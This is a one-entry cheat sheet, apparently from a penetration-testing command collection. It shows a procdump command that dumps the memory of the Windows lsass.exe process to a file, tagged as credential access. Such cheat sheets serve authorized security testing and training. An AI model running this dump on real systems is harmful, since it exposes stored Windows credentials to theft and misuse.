# procdump

% procdump, lsass, credentials
#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## procdump - dump lsass - local
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```